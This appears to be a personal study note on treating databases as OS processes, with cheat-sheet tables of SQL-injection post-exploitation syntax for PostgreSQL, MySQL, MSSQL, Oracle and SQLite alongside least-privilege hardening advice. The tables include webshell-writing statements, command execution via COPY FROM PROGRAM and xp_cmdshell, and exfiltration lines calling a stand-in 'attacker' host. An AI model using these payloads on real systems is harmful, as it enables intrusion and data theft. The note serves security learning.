# Database as a Process (Not a Black Box)
Tags: #architecture #databases #post-exploitation #mental-model #day4

## What This Is and Why It Exists

Most developers — and a surprising number of security engineers — model "the database" as a magical black box on the other side of a wire. You send SQL, you get rows back. The internals are opaque, the storage is "somewhere on disk", and the only attack surface is the SQL parser. This mental model is wrong, and it's the single biggest reason SQLi-to-RCE chains feel like dark magic the first time you see one.

The correct mental model:

> **A database is a long-running OS process. It has a UID. It has a home directory. It has open file descriptors. It has an environment block. It can fork child processes. It can call `system()`. The "database" abstraction is a layer the process exposes over a TCP socket — it is not a security boundary against the OS.**

This file exists to lock that picture in. Once you see databases this way, every post-exploitation primitive — file read, file write, command execution, lateral movement — stops feeling like trivia and starts feeling obvious. Of course it can read files; it's a process. Of course it can run commands; it's a process. The database has every capability the OS gave the user it runs as. SQL is just the API.

## How It Looks in Practice

### The Two Halves of "PostgreSQL"

```
                                    ┌────────────────────────────────────┐
                                    │ HOST: db01.internal                │
                                    │                                    │
                                    │ ┌────────────────────────────────┐ │
                                    │ │ OS USER: postgres (uid 113)    │ │
                                    │ │  ↳ HOME: /var/lib/postgresql   │ │
                                    │ │  ↳ ENV : PGDATA=...,           │ │
                                    │ │         AWS_SECRET=...,        │ │
                                    │ │         JWT_SECRET=...         │ │
                                    │ │  ↳ FDs : data files, log,      │ │
   App ──── TCP 5432 ───────────────┼─┼───── socket │ │
   sends SQL                        │ │  ↳ CAN  : open() /etc/passwd,  │ │
                                    │ │           fork()/exec("/bin/sh"│ │
                                    │ │           connect() outbound   │ │
                                    │ └────────────────────────────────┘ │
                                    │           ↑                        │
                                    │           │ this is a normal       │
                                    │           │ Linux process. The     │
                                    │           │ OS gives it the same   │
                                    │           │ powers it gives        │
                                    │           │ nginx, sshd, cron.     │
                                    └────────────────────────────────────┘
```

The thing that listens on port 5432 is one process (`postgres`). The thing that owns the data files in `/var/lib/postgresql/data` is the same process. The thing that the operating system kernel sees as `uid=113(postgres) gid=113(postgres)` is the same process. SQL queries are just bytes that arrive on a socket and get parsed; the parsed result becomes calls into a C program that does whatever the C program decides to do — including reading `/etc/passwd`, writing `/tmp/payload.so`, or `system("bash -i...")`.

The "database" you talk to is one face of this process. The OS user is the other face. **They are the same thing.**

### A SQLi Is a Foothold on the OS User

This is the lemma that does all the work:

> **If your SQL injection lets you run statements as the database superuser, you have already obtained code execution as the OS user the database is running as. The remaining work is just discovering the syntax.**

Every database engine ships SQL syntax for at least three of these four primitives:

| Primitive | Why it exists | What it gives you |
|---|---|---|
| **Read file from disk** | Bulk-load CSVs, ingest config | The same `read()` capability the OS user has |
| **Write file to disk** | Export query results, store binaries | The same `write()` capability — drop a webshell, drop a `.so`, drop an SSH key |
| **Execute OS command** | Schedule jobs, integrate with external tools | `system()` as the OS user — straight to RCE |
| **Make outbound network connection** | Replication, federated queries, monitoring | OOB exfil, internal pivoting, SSRF from inside the DB host |

These are not bugs. They are features the database vendor designed in deliberately because DBAs need them. Superuser is supposed to be the trust boundary that prevents abuse. SQLi removes that boundary.

### The Per-Database Cheat Sheet

Memorize the cells in your column. The other columns exist because every database has the same capabilities — only the syntax differs.

#### File read

| Database | Syntax | Notes |
|---|---|---|
| **PostgreSQL** | `COPY t FROM '/etc/passwd';` <br> `SELECT lo_import('/etc/passwd');` <br> `pg_read_file('/etc/passwd');` (built-in) | Superuser or `pg_read_server_files` role |
| **MySQL / MariaDB** | `SELECT LOAD_FILE('/etc/passwd');` | Requires `FILE` privilege AND `secure_file_priv` not set |
| **MSSQL** | `BULK INSERT t FROM 'C:\\Windows\\win.ini';` <br> `OPENROWSET(BULK 'C:\\path', SINGLE_CLOB)` | Requires `ADMINISTER BULK OPERATIONS` |
| **Oracle** | `UTL_FILE.GET_LINE` <br> Java stored procedure with `FileReader` | Requires `UTL_FILE` package access or Java perms |
| **SQLite** | (no native primitive — relies on host process having file access) | Embedded — same process as the app |

#### File write

| Database | Syntax | Notes |
|---|---|---|
| **PostgreSQL** | `COPY (SELECT '<?php ...?>') TO '/var/www/shell.php';` <br> `lo_create()` + `INSERT INTO pg_largeobject` + `lo_export()` (binary) | Superuser; large objects support arbitrary bytes |
| **MySQL / MariaDB** | `SELECT '<?php ...?>' INTO OUTFILE '/var/www/shell.php';` | `FILE` privilege + `secure_file_priv` empty |
| **MSSQL** | `OPENROWSET` with provider tricks; `xp_cmdshell 'echo > file'` | Often easier to skip straight to `xp_cmdshell` |
| **Oracle** | `UTL_FILE.PUT_LINE` <br> Java stored procedure with `FileWriter` <br> External tables write to filesystem | DBA role or `UTL_FILE` access |
| **SQLite** | Same caveat as read — process owns the disk | — |

#### Command execution (the trophy primitive)

| Database | Syntax | Why it works |
|---|---|---|
| **PostgreSQL** | `COPY t FROM PROGRAM 'id';` <br> `CREATE FUNCTION f() AS '/tmp/x.so', 'fn' LANGUAGE C; SELECT f();` <br> `CREATE EXTENSION dblink` + `dblink_exec` tricks | `FROM PROGRAM` is a feature (CVE-2019-9193 closed as wontfix); C extensions are how PostGIS/pgvector load |
| **MySQL / MariaDB** | UDF — write a `.so` via `INTO OUTFILE`, then `CREATE FUNCTION sys_exec RETURNS int SONAME 'lib_mysqludf_sys.so';` | `FILE` priv + writable plugin dir + version with the UDF library |
| **MSSQL** | `EXEC xp_cmdshell 'whoami';` <br> `sp_OACreate` for COM objects <br> CLR assemblies (`CREATE ASSEMBLY ... CREATE FUNCTION`) | `xp_cmdshell` is the canonical primitive — disabled by default in modern installs but commonly re-enabled |
| **Oracle** | `DBMS_SCHEDULER.CREATE_JOB('job', 'EXTERNAL_SCRIPT', '...')` <br> Java stored procedure with `Runtime.exec()` <br> EXTPROC via `DBMS_OUTPUT` and listeners | Multiple paths; oldest one is EXTPROC; modern path is Java SP |
| **SQLite** | Load extension that calls `system()` (e.g., via `load_extension()`) | Embedded — runs in the application process |

#### Outbound network (out-of-band exfil + internal SSRF)

| Database | Syntax | What it unlocks |
|---|---|---|
| **PostgreSQL** | `COPY (SELECT) TO PROGRAM 'curl ...';` <br> `dblink('host=attacker port=5432 ...')` | DNS exfil, HTTP exfil, internal port scan |
| **MySQL** | `LOAD_FILE('\\\\attacker\\share\\' || data)` (Windows SMB DNS) <br> `LOAD DATA INFILE` to remote URLs (some configs) | DNS exfil via UNC paths |
| **MSSQL** | `xp_dirtree '\\\\attacker\\share'` (DNS exfil via SMB) <br> `xp_cmdshell 'curl ...'` | Free DNS leak channel |
| **Oracle** | `UTL_HTTP.REQUEST('http://attacker/' || data)` <br> `UTL_INADDR.GET_HOST_NAME('attacker.tld')` <br> `DBMS_LDAP.INIT(...)` | Multiple HTTP/DNS/LDAP exfil channels |

You don't need to know all four columns. You need to know **your** column cold and recognize that the others exist so you can look them up the moment you encounter a new database.

## Security Implications

### The Superuser Trust Boundary Is Doing All the Work

Every cell in those tables is gated on a privilege the database engine considers "the trust boundary": superuser, `FILE`, `ADMINISTER BULK OPERATIONS`, DBA role. The database's threat model is:

> *"If you're superuser, you're trusted to do anything the OS user can do. If you're not, none of the dangerous primitives are reachable."*

This is a defensible model in a world where the only people with superuser are humans with full administrator access. It is **catastrophically wrong** in a world where applications connect with superuser credentials because the install script said to, and the application has a string-concatenation SQLi.

Every layer of the stack assumes the previous layer is trustworthy:

```
OS         "I'll let postgres read /etc/passwd because postgres asked nicely"
postgres   "I'll let the SQL session do that because the session is superuser"
session    "I'll do that because the application told me to"
app        "I'll do that because the user submitted this email value"
user       <-- attacker
```

A single SQLi in the application collapses every layer. The OS doesn't see the attacker — it sees postgres. postgres doesn't see the attacker — it sees a legitimate superuser session. The session doesn't see the attacker — it sees a query the application sent. The application doesn't see the attacker — it sees a string in the `email` field. Each layer is doing its job correctly. The trust chain is end-to-end broken.

### Why "Use an ORM" Doesn't Save You Here

ORMs prevent SQLi (in their parameterized paths). They do **nothing** about Levels 2–5. If your ORM has a `.raw()` escape hatch with concatenation, the moment a developer reaches for it, the entire post-exploitation tree above is reachable. The ORM is a doorman at the front door. The post-ex primitives are inside the building. Once you're past the doorman, the doorman doesn't help.

### Why "Run It in a Container" Helps More Than You'd Think

Containers narrow the OS user's blast radius dramatically. Read-only root filesystems mean Level 3 (file write) becomes much harder. Dropped capabilities (`CAP_NET_RAW`, `CAP_SYS_PTRACE`) shrink Level 5. No-new-privileges blocks SUID escalation. The database can still be subverted, but the postgres OS user inside a hardened container is a much weaker foothold than the postgres OS user on a VM.

This is why "least privilege at the OS layer" and "least privilege at the database layer" are different conversations and you need both. Each layer is one application of the [[Principle of Least Privilege]] — the underlying defensive discipline that determines how big a SQLi-to-RCE blast radius actually becomes.

### The Real Fix: Least Privilege at Every Layer

> **The exploitability of a SQLi is determined by the bug. The blast radius is determined by [[Principle of Least Privilege]].**

You cannot remove the existence of `COPY FROM PROGRAM`, `xp_cmdshell`, `LANGUAGE C`, `LOAD_FILE`, or `INTO OUTFILE` — they're features. What you *can* remove is the application's *access* to them. The fix is layered PoLP at every level: database role (not superuser), OS user (no sudo/docker), filesystem (read-only mounts), network (egress firewall), container (dropped caps), application (parameterize everything). See [[Principle of Least Privilege]] for the full layered hardening table and [[SQLi to RCE on PostgreSQL]] for the chain-specific version.

## What to Look For During an Engagement

### From the offensive side

The first three queries you run after confirming any SQLi on a database you're allowed to escalate on:

```sql
SELECT current_user, current_setting('is_superuser');     -- PostgreSQL
SELECT user(), @@version, @@hostname;                     -- MySQL
SELECT SYSTEM_USER, @@VERSION, HOST_NAME();               -- MSSQL
SELECT USER, BANNER FROM v$version;                       -- Oracle
```

The answer to "am I superuser/sysadmin/dba?" decides everything. If yes, the chain is sixty seconds of typing. If no, you're looking for a privilege bug or a misconfigured grant first.

Then ask: what OS is the database on, and what's the data directory?

```sql
-- PostgreSQL
SELECT version();
SELECT current_setting('data_directory');
SELECT current_setting('hba_file');

-- MySQL
SELECT @@datadir, @@version_compile_os, @@plugin_dir;

-- MSSQL
SELECT @@VERSION, SERVERPROPERTY('InstanceDefaultDataPath');

-- Oracle
SELECT * FROM v$version;
SELECT name FROM v$datafile;
```

Now you know where to write your payload, whether the OS is Linux or Windows, and which post-ex syntax to reach for.

### From the defensive side

Look for any of these in your application's database connection config — each one is a finding before you've even read the application code:

```
postgres://postgres:postgres@db/app          ← application connecting AS the superuser
mysql://root:root@db/app                     ← same, MySQL flavor
DATABASE_USERNAME=sa                         ← MSSQL, application connecting AS sysadmin
ALTER USER app SUPERUSER;                    ← migration script that elevates the app role
GRANT pg_read_server_files TO app;           ← role grant that opens Level 2
```

These are smoke without fire today. The fire is the SQLi nobody's found yet.

### The "Process View" Audit Question

When auditing a database deployment, ask the question that nobody asks: *"What can the OS user this database runs as do?"* — and answer it concretely.

```bash
# On the database host:
ps aux | grep -E 'postgres|mysql|mssql|oracle'
id postgres          # what groups is it in?
sudo -l -U postgres  # any sudo? (yes? you have a problem)
ls -la ~postgres     # what's in the home directory?
find / -user postgres -writable 2>/dev/null | head   # what can it write?
cat /proc/$(pgrep -f postgres | head -1)/environ | tr '\0' '\n'   # what's in its env?
```

Every line of output is the answer to "what does my SQLi escalate into?" If `find` shows the postgres user can write to `/var/www/html`, you have a webshell drop. If `cat /proc/.../environ` shows `AWS_SECRET=...`, your SQLi is a cloud takeover. The OS user's capabilities are the upper bound on what any SQLi can do — knowing them tells you exactly how big the blast radius is.

## Forever Hooks

> **"A database is a Linux process that happens to speak SQL. Every capability the OS user has, every SQLi inherits."**

> **"The trust boundary is superuser. The security model is: 'if you're superuser you can do anything we trust the DBA with'. SQLi makes the application user a DBA. The model breaks the moment the application has a single concatenated query."**

> **"There are only four post-exploitation primitives — read file, write file, run command, dial out — and every database has all four. Different syntax, same architecture."**

## Links

- [[SQLi to RCE on PostgreSQL]] — the worked end-to-end chain that motivated this file
- [[Principle of Least Privilege]] — the defensive discipline that determines how big the chain's blast radius actually is
- [[SQL Injection]] — the front door
- [[PostgreSQL Query Logs]] — the live-observation tool that makes the climb visible
- [[Client-Controlled IP Headers]] — frequently the bug that unlocks the climb (debug-gated catch block)
- [[Debug Mode Disclosure]] — the partner of the above

## My Notes
